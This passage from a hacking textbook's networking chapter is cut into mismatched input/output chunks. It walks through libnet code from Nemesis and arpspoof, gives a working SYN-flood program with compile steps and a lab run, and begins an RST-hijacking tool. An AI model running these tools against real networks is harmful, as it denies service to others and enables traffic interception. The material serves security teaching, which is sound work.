*/\npd.file_mem = NULL;\npd.file_s = 0;\nreturn;\n}\nFinally, the nemesis_arp() function calls the function buildarp() with\npointers to the header data structures. Judging from the way the return value\nfrom buildarp() is handled here, buildarp() builds the packet and injects it.\nThis function is found in yet another source file, nemesis-proto_arp.c.\nFrom nemesis-proto_arp.c\nint buildarp(ETHERhdr *eth, ARPhdr *arp, FileData *pd, char *device,\nint reply)\n{\nint n = 0;\nu_int32_t arp_packetlen;\nstatic u_int8_t *pkt;\nstruct libnet_link_int *l2 = NULL;\n/* validation tests */\n246 0x400\nif (pd->file_mem == NULL)\npd->file_s = 0;\narp_packetlen = LIBNET_ARP_H + LIBNET_ETH_H + pd->file_s;\n#ifdef DEBUG\nprintf(\"DEBUG: ARP packet length %u.\\n\", arp_packetlen);\nprintf(\"DEBUG: ARP payload size %u.\\n\", pd->file_s);\n#endif\nif ((l2 = libnet_open_link_interface(device, errbuf)) == NULL)\n{\nnemesis_device_failure(INJECTION_LINK, (const char *)device);\nreturn -1;\n}\nif (libnet_init_packet(arp_packetlen, &pkt) == -1)\n{\nfprintf(stderr, \"ERROR: Unable to allocate packet memory.\\n\");\nreturn -1;\n}\nlibnet_build_ethernet(eth->ether_dhost, eth->ether_shost, eth->ether_type,\nNULL, 0, pkt);\nlibnet_build_arp(arp->ar_hrd, arp->ar_pro, arp->ar_hln, arp->ar_pln,\narp->ar_op, arp->ar_sha, arp->ar_spa, arp->ar_tha, arp->ar_tpa,\npd->file_mem, pd->file_s, pkt + LIBNET_ETH_H);\nn = libnet_write_link_layer(l2, device, pkt, LIBNET_ETH_H +\nLIBNET_ARP_H + pd->file_s);\nif (verbose == 2)\nnemesis_hexdump(pkt, arp_packetlen, HEX_ASCII_DECODE);\nif (verbose == 3)\nnemesis_hexdump(pkt, arp_packetlen, HEX_RAW_DECODE);\nif (n != arp_packetlen)\n{\nfprintf(stderr, \"ERROR: Incomplete packet injection. Only \"\n\"wrote %d bytes.\\n\", n);\n}\nelse\n{\nif (verbose)\n{\nif (memcmp(eth->ether_dhost, (void *)&one, 6))\n{\nprintf(\"Wrote %d byte unicast ARP request packet through \"\n\"linktype %s.\\n\", n,\nnemesis_lookup_linktype(l2->linktype));\n}\nelse\n{\nprintf(\"Wrote %d byte %s packet through linktype %s.\\n\", n,\nNetworking 247\n(eth->ether_type == ETHERTYPE_ARP ? \"ARP\" : \"RARP\"),\nnemesis_lookup_linktype(l2->linktype));\n}\n}\n}\nlibnet_destroy_packet(&pkt);\nif (l2 != NULL)\nlibnet_close_link_interface(l2);\nreturn (n);\n}\nAt a high level, this function should be readable to you. Using libnet\nfunctions, it opens a link interface and initializes memory for a packet. Then,\nit builds the Ethernet layer using elements from the Ethernet header data\nstructure and then does the same for the ARP layer. Next, it writes the packet\nto the device to inject it, and finally cleans up by destroying the packet and\nclosing the interface. The documentation for these functions from the libnet\nman page is shown below for clarity.\nFrom the libnet Man Page\nlibnet_open_link_interface() opens a low-level packet interface. This is\nrequired to write link layer frames. Supplied is a u_char pointer to the\ninterface device name and a u_char pointer to an error buffer. Returned is a\nfilled in libnet_link_int struct or NULL on error.\nlibnet_init_packet() initializes a packet for use. If the size parameter is\nomitted (or negative) the library will pick a reasonable value for the user\n(currently LIBNET_MAX_PACKET). If the memory allocation is successful, the\nmemory is zeroed and the function returns 1. If there is an error, the\nfunction returns -1. Since this function calls malloc, you certainly should,\nat some point, make a corresponding call to destroy_packet().\nlibnet_build_ethernet() constructs an ethernet packet. Supplied is the\ndestination address, source address (as arrays of unsigned characterbytes)\nand the ethernet frame type, a pointer to an optional data payload, the\npayload length, and a pointer to a pre-allocated block of memory for the\npacket. The ethernet packet type should be one of the following:\nValue Type\nETHERTYPE_PUP PUP protocol\nETHERTYPE_IP IP protocol\nETHERTYPE_ARP ARP protocol\nETHERTYPE_REVARP Reverse ARP protocol\nETHERTYPE_VLAN IEEE VLAN tagging\nETHERTYPE_LOOPBACK Used to test interfaces\nlibnet_build_arp() constructs an ARP (Address Resolution Protocol) packet.\nSupplied are the following: hardware address type, protocol address type, the\nhardware address length, the protocol address length, the ARP packet type, the\nsender hardware address, the sender protocol address, the target hardware\naddress, the target protocol address, the packet payload, the payload size,\nand finally, a pointer to the packet header memory. Note that this function\n248 0x400\nonly builds ethernet/IP ARP packets, and consequently the first value should\nbe ARPHRD_ETHER. The ARP packet type should be one of the following:\nARPOP_REQUEST, ARPOP_REPLY, ARPOP_REVREQUEST, ARPOP_REVREPLY,\nARPOP_INVREQUEST, or ARPOP_INVREPLY.\nlibnet_destroy_packet() frees the memory associated with the packet.\nlibnet_close_link_interface() closes an opened low-level packet interface.\nReturned is 1 upon success or -1 on error.\nWith a basic understanding of C, API documentation, and common sense,\nyou can teach yourself just by examining open source projects. For example,\nDug Song provides a program called arpspoof, included with dsniff, that per-\nforms the ARP redirection attack.\nFrom the arpspoof Man Page\nNAME\narpspoof - intercept packets on a switched LAN\nSYNOPSIS\narpspoof [-i interface] [-t target] host\nDESCRIPTION\narpspoof redirects packets from a target host (or all hosts) on the LAN\nintended for another host on the LAN by forging ARP replies. This is\nan extremely effective way of sniffing traffic on a switch.\nKernel IP forwarding (or a userland program which accomplishes the\nsame, e.g. fragrouter(8)) must be turned on ahead of time.\nOPTIONS\n-i interface\nSpecify the interface to use.\n-t target\nSpecify a particular host to ARP poison (if not specified, all\nhosts on the LAN).\nhost Specify the host you wish to intercept packets for (usually the\nlocal gateway).\nSEE ALSO\ndsniff(8), fragrouter(8)\nAUTHOR\nDug Song <dugsong@monkey.org>\nThe magic of this program comes from its arp_send() function, which also\nuses libnet to spoof packets. The source code for this function should be read-\nable to you, since many of the previously explained libnet functions are used\n(shown in bold below). The use of structures and an error buffer should also\nbe familiar.\nNetworking 249\narpspoof.c\nstatic struct libnet_link_int *llif;\nstatic struct ether_addr spoof_mac, target_mac;\nstatic in_addr_t spoof_ip, target_ip;\n...\nint\narp_send(struct libnet_link_int *llif, char *dev,\nint op, u_char *sha, in_addr_t spa, u_char *tha, in_addr_t tpa)\n{\nchar ebuf[128];\nu_char pkt[60];\nif (sha == NULL &&\n(sha = (u_char *)libnet_get_hwaddr(llif, dev, ebuf)) == NULL) {\nreturn (-1);\n}\nif (spa == 0) {\nif ((spa = libnet_get_ipaddr(llif, dev, ebuf)) == 0)\nreturn (-1);\nspa = htonl(spa); /* XXX */\n}\nif (tha == NULL)\ntha = \"\\xff\\xff\\xff\\xff\\xff\\xff\";\nlibnet_build_ethernet(tha, sha, ETHERTYPE_ARP, NULL, 0, pkt);\nlibnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, ETHER_ADDR_LEN, 4,\nop, sha, (u_char *)&spa, tha, (u_char *)&tpa,\nNULL, 0, pkt + ETH_H);\nfprintf(stderr, \"%s \",\nether_ntoa((struct ether_addr *)sha));\nif (op == ARPOP_REQUEST) {\nfprintf(stderr, \"%s 0806 42: arp who-has %s tell %s\\n\",\nether_ntoa((struct ether_addr *)tha),\nlibnet_host_lookup(tpa, 0),\nlibnet_host_lookup(spa, 0));\n}\nelse {\nfprintf(stderr, \"%s 0806 42: arp reply %s is-at \",\nether_ntoa((struct ether_addr *)tha),\nlibnet_host_lookup(spa, 0));\nfprintf(stderr, \"%s\\n\",\nether_ntoa((struct ether_addr *)sha));\n}\nreturn (libnet_write_link_layer(llif, dev, pkt, sizeof(pkt)) == sizeof(pkt));\n}\n250 0x400"
  },
  {
    "input": "0x450 Denial of Service",
    "output": "The remaining libnet functions get hardware addresses, get the IP address,\nand look up hosts. These functions have descriptive names and are explained\nin detail on the libnet man page.\nFrom the libnet Man Page\nlibnet_get_hwaddr() takes a pointer to a link layer interface struct, a\npointer to the network device name, and an empty buffer to be used in case of\nerror. The function returns the MAC address of the specified interface upon\nsuccess or 0 upon error (and errbuf will contain a reason).\nlibnet_get_ipaddr() takes a pointer to a link layer interface struct, a\npointer to the network device name, and an empty buffer to be used in case of\nerror. Upon success the function returns the IP address of the specified\ninterface in host-byte order or 0 upon error (and errbuf will contain a\nreason).\nlibnet_host_lookup() converts the supplied network-ordered (big-endian) IPv4\naddress into its human-readable counterpart. If use_name is 1,\nlibnet_host_lookup() will attempt to resolve this IP address and return a\nhostname, otherwise (or if the lookup fails), the function returns a dotted-\ndecimal ASCII string.\nOnce you’ve learned how to read C code, existing programs can teach\nyou a lot by example. Programming libraries like libnet and libpcap have\nplenty of documentation that explains all the details you may not be able to\ndivine from the source alone. The goal here is to teach you how to learn\nfrom source code, as opposed to just teaching how to use a few libraries. After\nall, there are many other libraries and a lot of existing source code that\nuses them.\n0x450 Denial of Service\nOne of the simplest forms of network attack is a Denial of Service (DoS) attack.\nInstead of trying to steal information, a DoS attack simply prevents access to\na service or resource. There are two general forms of DoS attacks: those that\ncrash services and those that flood services.\nDenial of Service attacks that crash services are actually more similar to\nprogram exploits than network-based exploits. Often, these attacks are depen-\ndent on a poor implementation by a specific vendor. A buffer overflow exploit\ngone wrong will usually just crash the target program instead of directing the\nexecution flow to the injected shellcode. If this program happens to be on a\nserver, then no one else can access that server after it has crashed. Crashing\nDoS attacks like this are closely tied to a certain program and a certain version.\nSince the operating system handles the network stack, crashes in this code\nwill take down the kernel, denying service to the entire machine. Many of\nthese vulnerabilities have long since been patched on modern operating\nsystems, but it’s still useful to think about how these techniques might be\napplied to different situations.\nNetworking 251"
  },
  {
    "input": "0x451 SYN Flooding",
    "output": "0x451 SYN Flooding\nA SYN flood tries to exhaust states in the TCP/IP stack. Since TCP maintains\n“reliable” connections, each connection needs to be tracked somewhere. The\nTCP/IP stack in the kernel handles this, but it has a finite table that can only\ntrack so many incoming connections. A SYN flood uses spoofing to take\nadvantage of this limitation.\nThe attacker floods the victim’s system with many SYN packets, using a\nspoofed nonexistent source address. Since a SYN packet is used to initiate a\nTCP connection, the victim’s machine will send a SYN/ACK packet to the\nspoofed address in response and wait for the expected ACK response. Each\nof these waiting, half-open connections goes into a backlog queue that has\nlimited space. Since the spoofed source addresses don’t actually exist, the\nACK responses needed to remove these entries from the queue and complete\nthe connections never come. Instead, each half-open connection must time\nout, which takes a relatively long time.\nAs long as the attacker continues to flood the victim’s system with spoofed\nSYN packets, the victim’s backlog queue will remain full, making it nearly\nimpossible for real SYN packets to get to the system and initiate valid TCP/IP\nconnections.\nUsing the Nemesis and arpspoof source code as reference, you should be\nable to write a program that performs this attack. The example program below\nuses libnet functions pulled from the source code and socket functions previ-\nously explained. The Nemesis source code uses the function libnet_get_prand()\nto obtain pseudo-random numbers for various IP fields. The function\nlibnet_seed_prand() is used to seed the randomizer. These functions are\nsimilarly used below.\nsynflood.c\n#include <libnet.h>\n#define FLOOD_DELAY 5000 // Delay between packet injects by 5000 ms.\n/* Returns an IP in x.x.x.x notation */\nchar *print_ip(u_long *ip_addr_ptr) {\nreturn inet_ntoa( *((struct in_addr *)ip_addr_ptr) );\n}\nint main(int argc, char *argv[]) {\nu_long dest_ip;\nu_short dest_port;\nu_char errbuf[LIBNET_ERRBUF_SIZE], *packet;\nint opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;\nif(argc < 3)\n{\nprintf(\"Usage:\\n%s\\t <target host> <target port>\\n\", argv[0]);\nexit(1);\n}\n252 0x400\ndest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // The host\ndest_port = (u_short) atoi(argv[2]); // The port\nnetwork = libnet_open_raw_sock(IPPROTO_RAW); // Open network interface.\nif (network == -1)\nlibnet_error(LIBNET_ERR_FATAL, \"can't open network interface. -- this program must run\nas root.\\n\");\nlibnet_init_packet(packet_size, &packet); // Allocate memory for packet.\nif (packet == NULL)\nlibnet_error(LIBNET_ERR_FATAL, \"can't initialize packet memory.\\n\");\nlibnet_seed_prand(); // Seed the random number generator.\nprintf(\"SYN Flooding port %d of %s..\\n\", dest_port, print_ip(&dest_ip));\nwhile(1) // loop forever (until break by CTRL-C)\n{\nlibnet_build_ip(LIBNET_TCP_H, // Size of the packet sans IP header.\nIPTOS_LOWDELAY, // IP tos\nlibnet_get_prand(LIBNET_PRu16), // IP ID (randomized)\n0, // Frag stuff\nlibnet_get_prand(LIBNET_PR8), // TTL (randomized)\nIPPROTO_TCP, // Transport protocol\nlibnet_get_prand(LIBNET_PRu32), // Source IP (randomized)\ndest_ip, // Destination IP\nNULL, // Payload (none)\n0, // Payload length\npacket); // Packet header memory\nlibnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // Source TCP port (random)\ndest_port, // Destination TCP port\nlibnet_get_prand(LIBNET_PRu32), // Sequence number (randomized)\nlibnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized)\nTH_SYN, // Control flags (SYN flag set only)\nlibnet_get_prand(LIBNET_PRu16), // Window size (randomized)\n0, // Urgent pointer\nNULL, // Payload (none)\n0, // Payload length\npacket + LIBNET_IP_H); // Packet header memory\nif (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)\nlibnet_error(LIBNET_ERR_FATAL, \"can't compute checksum\\n\");\nbyte_count = libnet_write_ip(network, packet, packet_size); // Inject packet.\nif (byte_count < packet_size)\nlibnet_error(LIBNET_ERR_WARNING, \"Warning: Incomplete packet written. (%d of %d\nbytes)\", byte_count, packet_size);\nusleep(FLOOD_DELAY); // Wait for FLOOD_DELAY milliseconds.\n}\nlibnet_destroy_packet(&packet); // Free packet memory.\nif (libnet_close_raw_sock(network) == -1) // Close the network interface.\nNetworking 253\nlibnet_error(LIBNET_ERR_WARNING, \"can't close network interface.\");\nreturn 0;\n}\nThis program uses a print_ip() function to handle converting the\nu_long type, used by libnet to store IP addresses, to the struct type expected\nby inet_ntoa(). The value doesn’t change—the typecasting just appeases the\ncompiler.\nThe current release of libnet is version 1.1, which is incompatible with\nlibnet 1.0. However, Nemesis and arpspoof still rely on the 1.0 version of\nlibnet, so this version is included in the LiveCD and this is also what we will\nuse in our synflood program. Similar to compiling with libpcap, when compil-\ning with libnet, the flag -lnet is used. However, this isn’t quite enough infor-\nmation for the compiler, as the output below shows.\nreader@hacking:~/booksrc $ gcc -o synflood synflood.c -lnet\nIn file included from synflood.c:1:\n/usr/include/libnet.h:87:2: #error \"byte order has not been specified, you'll\"\nsynflood.c:6: error: syntax error before string constant\nreader@hacking:~/booksrc $\nThe compiler still fails because several mandatory define flags need to be\nset for libnet. Included with libnet, a program called libnet-config will output\nthese flags.\nreader@hacking:~/booksrc $ libnet-config --help\nUsage: libnet-config [OPTIONS]\nOptions:\n[--libs]\n[--cflags]\n[--defines]\nreader@hacking:~/booksrc $ libnet-config --defines\n-D_BSD_SOURCE -D__BSD_SOURCE -D__FAVOR_BSD -DHAVE_NET_ETHERNET_H\n-DLIBNET_LIL_ENDIAN\nUsing the BASH shell’s command substitution in both, these defines can\nbe dynamically inserted into the compile command.\nreader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o synflood\nsynflood.c -lnet\nreader@hacking:~/booksrc $ ./synflood\nUsage:\n./synflood <target host> <target port>\nreader@hacking:~/booksrc $\nreader@hacking:~/booksrc $ ./synflood 192.168.42.88 22\nFatal: can't open network interface. -- this program must run as root.\nreader@hacking:~/booksrc $ sudo ./synflood 192.168.42.88 22\nSYN Flooding port 22 of 192.168.42.88..\n254 0x400\nIn the example above, the host 192.168.42.88 is a Windows XP machine\nrunning an openssh server on port 22 via cygwin. The tcpdump output below\nshows the spoofed SYN packets flooding the host from apparently random\nIPs. While the program is running, legitimate connections cannot be made\nto this port.\nreader@hacking:~/booksrc $ sudo tcpdump -i eth0 -nl -c 15 \"host 192.168.42.88\"\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes\n17:08:16.334498 IP 121.213.150.59.4584 > 192.168.42.88.22: S\n751659999:751659999(0) win 14609\n17:08:16.346907 IP 158.78.184.110.40565 > 192.168.42.88.22: S\n139725579:139725579(0) win 64357\n17:08:16.358491 IP 53.245.19.50.36638 > 192.168.42.88.22: S\n322318966:322318966(0) win 43747\n17:08:16.370492 IP 91.109.238.11.4814 > 192.168.42.88.22: S\n685911671:685911671(0) win 62957\n17:08:16.382492 IP 52.132.214.97.45099 > 192.168.42.88.22: S\n71363071:71363071(0) win 30490\n17:08:16.394909 IP 120.112.199.34.19452 > 192.168.42.88.22: S\n1420507902:1420507902(0) win 53397\n17:08:16.406491 IP 60.9.221.120.21573 > 192.168.42.88.22: S\n2144342837:2144342837(0) win 10594\n17:08:16.418494 IP 137.101.201.0.54665 > 192.168.42.88.22: S\n1185734766:1185734766(0) win 57243\n17:08:16.430497 IP 188.5.248.61.8409 > 192.168.42.88.22: S\n1825734966:1825734966(0) win 43454\n17:08:16.442911 IP 44.71.67.65.60484 > 192.168.42.88.22: S\n1042470133:1042470133(0) win 7087\n17:08:16.454489 IP 218.66.249.126.27982 > 192.168.42.88.22: S\n1767717206:1767717206(0) win 50156\n17:08:16.466493 IP 131.238.172.7.15390 > 192.168.42.88.22: S\n2127701542:2127701542(0) win 23682\n17:08:16.478497 IP 130.246.104.88.48221 > 192.168.42.88.22: S\n2069757602:2069757602(0) win 4767\n17:08:16.490908 IP 140.187.48.68.9179 > 192.168.42.88.22: S\n1429854465:1429854465(0) win 2092\n17:08:16.502498 IP 33.172.101.123.44358 > 192.168.42.88.22: S\n1524034954:1524034954(0) win 26970\n15 packets captured\n30 packets received by filter\n0 packets dropped by kernel\nreader@hacking:~/booksrc $ ssh -v 192.168.42.88\nOpenSSH_4.3p2, OpenSSL 0.9.8c 05 Sep 2006\ndebug1: Reading configuration data /etc/ssh/ssh_config\ndebug1: Connecting to 192.168.42.88 [192.168.42.88] port 22.\ndebug1: connect to address 192.168.42.88 port 22: Connection refused\nssh: connect to host 192.168.42.88 port 22: Connection refused\nreader@hacking:~/booksrc $\nSome operating systems (for example, Linux) use a technique called\nsyncookies to try to prevent SYN flood attacks. The TCP stack using syncookies\nadjusts the initial acknowledgment number for the responding SYN/ACK\npacket using a value based on host details and time (to prevent replay attacks).\nNetworking 255"
  },
  {
    "input": "0x453 Teardrop",
    "output": "The TCP connections don’t actually become active until the final ACK packet\nfor the TCP handshake is checked. If the sequence number doesn’t match\northe ACK never arrives, a connection is never created. This helps prevent\nspoofed connection attempts, since the ACK packet requires information to\nbe sent to the source address of the initial SYN packet.\n0x452 The Ping of Death\nAccording to the specification for ICMP, ICMP echo messages can only have\n216, or 65,536, bytes of data in the data part of the packet. The data portion\nof ICMP packets is commonly overlooked, since the important information is\nin the header. Several operating systems crashed if they were sent ICMP echo\nmessages that exceeded the size specified. An ICMP echo message of this gar-\ngantuan size became affectionately known as “The Ping of Death.” It was a\nvery simple hack exploiting a vulnerability that existed because no one ever\nconsidered this possibility. It should be easy for you to write a program using\nlibnet that can perform this attack; however, it won’t be that useful in the\nreal world. Modern systems are all patched against this vulnerability.\nHowever, history tends to repeat itself. Even though oversized ICMP\npackets won’t crash computers anymore, new technologies sometimes\nsuffer from similar problems. The Bluetooth protocol, commonly used with\nphones, has a similar ping packet on the L2CAP layer, which is also used to\nmeasure the communication time on established links. Many implementations\nof Bluetooth suffer from the same oversized ping packet problem. Adam\nLaurie, Marcel Holtmann, and Martin Herfurt have dubbed this attack\nBluesmack and have released source code by the same name that performs\nthis attack.\n0x453 Teardrop\nAnother crashing DoS attack that came about for the same reason was called\nteardrop. Teardrop exploited another weakness in several vendors’ implemen-\ntations of IP fragmentation reassembly. Usually, when a packet is fragmented,\nthe offsets stored in the header will line up to reconstruct the original packet\nwith no overlap. The teardrop attack sent packet fragments with overlapping\noffsets, which caused implementations that didn’t check for this irregular\ncondition to inevitably crash.\nAlthough this specific attack doesn’t work anymore, understanding the\nconcept can reveal problems in other areas. Although not limited to a Denial\nof Service, a recent remote exploit in the OpenBSD kernel (which prides\nitself on security) had to do with fragmented IPv6 packets. IP version 6 uses\nmore complicated headers and even a different IP address format than the\nIPv4 most people are familiar with. Often, the same mistakes made in the\npast are repeated by early implementations of new products.\n256 0x400"
  },
  {
    "input": "0x455 Amplification Attacks",
    "output": "0x454 Ping Flooding\nFlooding DoS attacks don’t try to necessarily crash a service or resource, but\ninstead try to overload it so it can’t respond. Similar attacks can tie up other\nresources, such as CPU cycles and system processes, but a flooding attack\nspecifically tries to tie up a network resource.\nThe simplest form of flooding is just a ping flood. The goal is to use up\nthe victim’s bandwidth so that legitimate traffic can’t get through. The attacker\nsends many large ping packets to the victim, which eat away at the bandwidth\nof the victim’s network connection.\nThere’s nothing really clever about this attack—it’s just a battle of band-\nwidth. An attacker with greater bandwidth than a victim can send more data\nthan the victim can receive and therefore deny other legitimate traffic from\ngetting to the victim.\n0x455 Amplification Attacks\nThere are actually some clever ways to perform a ping flood without using\nmassive amounts of bandwidth. An amplification attack uses spoofing and\nbroadcast addressing to amplify a single stream of packets by a hundred-fold.\nFirst, a target amplification system must be found. This is a network that\nallows communication to the broadcast address and has a relatively high\nnumber of active hosts. Then the attacker sends large ICMP echo request\npackets to the broadcast address of the amplification network, with a spoofed\nsource address of the victim’s system. The amplifier will broadcast these packets\nto all the hosts on the amplification network, which will then send correspond-\ning ICMP echo reply packets to the spoofed source address (i.e., to the victim’s\nmachine).\nThis amplification of traffic allows the attacker to send a relatively small\nstream of ICMP echo request packets out, while the victim gets swamped with\nup to a couple hundred times as many ICMP echo reply packets. This attack\ncan be done with both ICMP packets and UDP echo packets. These techniques\nare known as smurf and fraggle attacks, respectively.\nSpoofed packet from\nAmplification network\nvictim’s address sent to the\nbroadcast address of the\nA B C D E amplification network\nAttacker\nF G H I J\nAll hosts respond\nto the spoofed\nsource address\nVictim\nNetworking 257"
  },
  {
    "input": "0x460 TCP/IP Hijacking",
    "output": "0x456 Distributed DoS Flooding\nA distributed DoS (DDoS) attack is a distributed version of a flooding DoS\nattack. Since bandwidth consumption is the goal of a flooding DoS attack,\nthe more bandwidth the attacker is able to work with, the more damage they\ncan do. In a DDoS attack, the attacker first compromises a number of other\nhosts and installs daemons on them. Systems installed with such software are\ncommonly referred to as bots and make up what is known as a botnet. These\nbots wait patiently until the attacker picks a victim and decides to attack. The\nattacker uses some sort of a controlling program, and all of the bots simulta-\nneously attack the victim with some form of flooding DoS attack. Not only\ndoes the great number of distributed hosts multiply the effect of the flood-\ning, this also makes tracing the attack source much more difficult.\n0x460 TCP/IP Hijacking\nTCP/IP hijacking is a clever technique that uses spoofed packets to take over a\nconnection between a victim and a host machine. This technique is exception-\nally useful when the victim uses a one-time password to connect to the host\nmachine. A one-time password can be used to authenticate once and only once,\nwhich means that sniffing the authentication is useless for the attacker.\nTo carry out a TCP/IP hijacking attack, the attacker must be on the same\nnetwork as the victim. By sniffing the local network segment, all of the details\nof open TCP connections can be pulled from the headers. As we have seen,\neach TCP packet contains a sequence number in its header. This sequence\nnumber is incremented with each packet sent to ensure that packets are\nreceived in the correct order. While sniffing, the attacker has access to the\nsequence numbers for a connection between a victim (system A in the follow-\ning illustration) and a host machine (system B). Then the attacker sends a\nspoofed packet from the victim’s IP address to the host machine, using the\nsniffed sequence number to provide the proper acknowledgment number,\nasshown here.\nsrc : 192.168.0.100\ndst : 192.168.0.200\nseq #: 1429775000\nack #: 1250510000\nlen : 24\nSystem A System B\n192.168.0.100 192.168.0.200\nsrc : 192.168.0.200\ndst : 192.168.0.100\nseq #: 1250510000\nack #: 1429775024\nlen : 167 src : 192.168.0.100\ndst : 192.168.0.200\nseq #: 1429775024\nack #: 1250510167\nlen : 71\nAttacker\nsystem\n258 0x400"
  },
  {
    "input": "0x461 RST Hijacking",
    "output": "The host machine will receive the spoofed packet with the correct\nacknowledgment number and will have no reason to believe it didn’t come\nfrom the victim machine.\n0x461 RST Hijacking\nA very simple form of TCP/IP hijacking involves injecting an authentic-looking\nreset (RST) packet. If the source is spoofed and the acknowledgment number\nis correct, the receiving side will believe that the source actually sent the reset\npacket, and the connection will be reset.\nImagine a program to perform this attack on a target IP. At a high level,\nit would sniff using libpcap, then inject RST packets using libnet. Such a\nprogram doesn’t need to look at every packet but only at established TCP\nconnections to the target IP. Many other programs that use libpcap also don’t\nneed to look at every single packet, so libpcap provides a way to tell the kernel\nto only send certain packets that match a filter. This filter, known as a Berkeley\nPacket Filter (BPF), is very similar to a program. For example, the filter rule\nto filter for a destination IP of 192.168.42.88 is \"dst host 192.168.42.88\". Like\naprogram, this rule consists of keyword and must be compiled before it’s\nactually sent to the kernel. The tcpdump program uses BPFs to filter what it\ncaptures; it also provides a mode to dump the filter program.\nreader@hacking:~/booksrc $ sudo tcpdump -d \"dst host 192.168.42.88\"\n(000) ldh [12]\n(001) jeq #0x800 jt 2 jf 4\n(002) ld [30]\n(003) jeq #0xc0a82a58 jt 8 jf 9\n(004) jeq #0x806 jt 6 jf 5\n(005) jeq #0x8035 jt 6 jf 9\n(006) ld [38]\n(007) jeq #0xc0a82a58 jt 8 jf 9\n(008) ret #96\n(009) ret #0\nreader@hacking:~/booksrc $ sudo tcpdump -ddd \"dst host 192.168.42.88\"\n10\n40 0 0 12\n21 0 2 2048\n32 0 0 30\n21 4 5 3232246360\n21 1 0 2054\n21 0 3 32821\n32 0 0 38\n21 0 1 3232246360\n6 0 0 96\n6 0 0 0\nreader@hacking:~/booksrc $\nAfter the filter rule is compiled, it can be passed to the kernel for filter-\ning. Filtering for established connections is a bit more complicated. All\nestablished connections will have the ACK flag set, so this is what we should\nlook for. The TCP flags are found in the 13th octet of the TCP header. The\nNetworking 259\nflags are found in the following order, from left to right: URG, ACK, PSH,\nRST, SYN, and FIN. This means that if the ACK flag is turned on, the 13th\noctet would be 00010000 in binary, which is 16 in decimal. If both SYN and\nACK are turned on, the 13th octet would be 00010010 in binary, which is 18\nindecimal.\nIn order to create a filter that matches when the ACK flag is turned on\nwithout caring about any of the other bits, the bitwise AND operator is used.\nANDing 00010010 with 00010000 will produce 00010000, since the ACK bit is the\nonly bit where both bits are 1. This means that a filter of tcp[13] & 16 == 16\nwill match the packets where the ACK flag is turned on, regardless of the\nstate of the remaining flags.\nThis filter rule can be rewritten using named values and inverted logic as\ntcp[tcpflags] & tcp-ack != 0. This is easier to read but still provides the same\nresult. This rule can be combined with the previous destination IP rule using\nand logic; the full rule is shown below.\nreader@hacking:~/booksrc $ sudo tcpdump -nl \"tcp[tcpflags] & tcp-ack != 0 and dst host\n192.168.42.88\"\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes\n10:19:47.567378 IP 192.168.42.72.40238 > 192.168.42.88.22: . ack 2777534975 win 92\n<nop,nop,timestamp 85838571 0>\n10:19:47.770276 IP 192.168.42.72.40238 > 192.168.42.88.22: . ack 22 win 92 <nop,nop,timestamp\n85838621 29399>\n10:19:47.770322 IP 192.168.42.72.40238 > 192.168.42.88.22: P 0:20(20) ack 22 win 92\n<nop,nop,timestamp 85838621 29399>\n10:19:47.771536 IP 192.168.42.72.40238 > 192.168.42.88.22: P 20:732(712) ack 766 win 115\n<nop,nop,timestamp 85838622 29399>\n10:19:47.918866 IP 192.168.42.72.40238 > 192.168.42.88.22: P 732:756(24) ack 766 win 115\n<nop,nop,timestamp 85838659 29402>\nA similar rule is used in the following program to filter the packets\nlibpcap sniffs. When the program gets a packet, the header information is\nused to spoof a RST packet. This program will be explained as it’s listed.\nrst_hijack.c\n#include <libnet.h>\n#include <pcap.h>\n#include \"hacking.h\"\nvoid caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);\nint set_packet_filter(pcap_t *, struct in_addr *);\nstruct data_pass {\nint libnet_handle;\nu_char *packet;\n};\nint main(int argc, char *argv[]) {\nstruct pcap_pkthdr cap_header;\nconst u_char *packet, *pkt_data;\npcap_t *pcap_handle;\n260 0x400\nchar errbuf[PCAP_ERRBUF_SIZE]; // Same size as LIBNET_ERRBUF_SIZE\nchar *device;\nu_long target_ip;\nint network;\nstruct data_pass critical_libnet_data;\nif(argc < 1) {\nprintf(\"Usage: %s <target IP>\\n\", argv[0]);\nexit(0);\n}\ntarget_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);\nif (target_ip == -1)\nfatal(\"Invalid target address\");\ndevice = pcap_lookupdev(errbuf);\nif(device == NULL)\nfatal(errbuf);\npcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);\nif(pcap_handle == NULL)\nfatal(errbuf);\ncritical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW);\nif(critical_libnet_data.libnet_handle == -1)\nlibnet_error(LIBNET_ERR_FATAL, \"can't open network interface. -- this program must run\nas root.\\n\");\nlibnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));\nif (critical_libnet_data.packet == NULL)\nlibnet_error(LIBNET_ERR_FATAL, \"can't initialize packet memory.\\n\");\nlibnet_seed_prand();\nset_packet_filter(pcap_handle, (struct in_addr *)&target_ip);\nprintf(\"Resetting all TCP connections to %s on %s\\n\", argv[1], device);\npcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);\npcap_close(pcap_handle);\n}\nThe majority of this program should make sense to you. In the beginning,\na data_pass structure is defined, which is used to pass data through the libpcap\ncallback. libnet is used to open a raw socket interface and to allocate packet\nmemory. The file descriptor for the raw socket and a pointer to the packet\nmemory will be needed in the callback function, so this critical libnet data is\nstored in its own structure. The final argument to the pcap_loop() call is user\npointer, which is passed directly to the callback function. By passing a pointer\nto the critical_libnet_data structure, the callback function will have access to\neverything in this structure. Also, the snap length value used in pcap_open_live()\nhas been reduced from 4096 to 128, since the information needed from the\npacket is just in the headers.\nNetworking 261\n/* Sets a packet filter to look for established TCP connections to target_ip */\nint set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip) {\nstruct bpf_program filter;\nchar 